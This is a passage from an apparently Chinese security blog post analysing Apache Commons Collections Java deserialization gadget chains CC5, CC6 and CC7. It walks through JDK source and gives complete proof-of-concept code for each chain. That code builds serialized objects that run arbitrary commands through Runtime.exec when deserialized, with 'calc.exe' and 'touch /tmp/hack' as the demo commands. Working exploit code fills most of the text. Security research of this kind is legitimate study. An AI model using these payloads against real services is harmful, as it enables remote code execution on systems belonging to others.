Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取出val变量，进行一系列字符串操作，如果我们把这个val变量设置为TiedMapEntry类的话，在程序运行到if(valObj == null)的时候就会触发toString，完成一系列调用,不过这个val变量是私有的，需要通过反射来进行设置变量，</p>
<p><strong>调用链</strong></p>
<ul>
<li>通过取出val中的TiedMapEntry</li>
<li>触发toString函数</li>
<li>触发getValue函数</li>
<li>触发<code>this.map.get(this.key)</code> Map类为lazymap,key随意</li>
<li>触发this.factory.transform(key)，factory为ChainedTransformer类</li>
<li>最终执行命令</li>
</ul>
<p>最终完整poc如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"lih3iu"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException ins = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valfield = ins.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(ins, entry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><h4 id="Gadget-Chain-6"><a href="#Gadget-Chain-6" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashSet.readObject()</span><br><span class="line">               java.util.HashMap.put()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>



<h4 id="Exploit-Code-5"><a href="#Exploit-Code-5" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><p>与上面的CommonsCollections5对比来讲，主要是换了下前面的触发点，在链5中是通过toString函数触发的，在链6里面是通过hashcode触发</p>
<p>跟进hashcode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次往回推 哪里调用了hashCode方法</p>
<p>跟进HashMap#hash</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里会调用传入对象的hashCode方法，再次跟进调用hash函数的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进HashSet#put</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal capacity: "</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过readObject来读取值并且传入map.put函数中，完成之后的一切调用</p>
<p>来看下writeObject是如何写入值的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过读取map的key来进行写入，所以我们需要做的就是将map的key进行我们需要设置的相关类。</p>
<p>Exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123;<span class="string">"touch /tmp/hack"</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">                <span class="title">new</span> <span class="title">ConstantTransformer</span>(1) &#125;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h3><h4 id="Gadget-Chain-7"><a href="#Gadget-Chain-7" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>



<h4 id="Exploit-Code-6"><a href="#Exploit-Code-6" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><p>和前面的链后面也都是一样的，只是换了下前面LazyMap#get的触发方式</p>
<p>AbstractMap#equal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将触发点单拿出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!value.equals(m.get(key)))</span><br></pre></td></tr></table></figure>

<p>如果在将m赋值为LazyMap的情况下，就可以触发LazyMap#get了</p>
<p>接着去跟进下equals的调用</p>
<p>Hashtable#reconstitutionPut</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而在Hashtable的readObject方法中有reconstitution的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold and loadFactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Validate loadFactor (ignore threshold - it will be re-computed)</span></span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"Illegal Load: "</span> + loadFactor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">        <span class="keyword">int</span> elements = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Validate # of elements</span></span><br><span class="line">        <span class="keyword">if</span> (elements &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"Illegal # of Elements: "</span> + elements);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Clamp original length to be more than elements / loadFactor</span></span><br><span class="line">.....</span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we're actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">length</span>)</span>;</span><br><span class="line">        table = <span class="keyword">new</span> Entry&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="keyword">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V)s.readObject();</span><br><span class="line">            <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进下writeObject看是如何进行写入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Entry&lt;K, V&gt; entryStack = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> Entry&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="keyword">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>逻辑为读取当前hashtable中的key/value给entryStack，然后再从entryStack中拿key/value进行写入</p>
<p>所以我们的exp的主要逻辑就是通过put方法将hashtable中的key/value设置好就可以了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Hashtable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;<span class="string">"touch /tmp/hack"</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod",</span><br><span class="line">                new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line"><span class="class">                <span class="title">execArgs</span>),</span></span><br><span class="line"><span class="class">            <span class="title">new</span> <span class="title">ConstantTransformer</span>(1)&#125;</span>;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="Questions-2"><a href="#Questions-2" class="headerlink" title="Questions"></a>Questions</h4><p>1.为什么要放两个lazyMap以及为什么要put一个yy和一个zz</p>
<p>跟进反序列化的过程</p>
<p><img src="https://s1.ax1x.com/2020/08/09/aTBjbV.png" alt="aTBjbV.png"></p>
<p>可以看到在第一次循环的过程，tab为空，在最后会将当前的key/value传入tab，下次中再进行使用，所以为了下次可以正常使用tab中的值，我们必须是的传入的key经过hash函数后的值相同，这同样也是为什么我们要传yy和Zz的原因</p>
<p><a href="https://imgchr.com/i/aTreLq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/08/09/aTreLq.png" alt="aTreLq.png"></a></p>
<p>2.在最后为什么要remove掉yy这个key</p>
<p>在exp中我们调用了Hashtable#put，同样代码也进入了equals</p>
<p>首先在这里得到key</p>
<p><img src="https://s1.ax1x.com/2020/08/09/aT28SO.png" alt="aT28SO.png"></p>
<p>跟进get传值</p>
<p><img src="https://s1.ax1x.com/2020/08/09/aTgKG8.png" alt="aTgKG8.png"></p>
<p>所以会把yy这个键值对放入当前的map，这样会造成在反序列化中两个LazyMap的hashcode不相同，所以要将yy这个键值对remove</p>
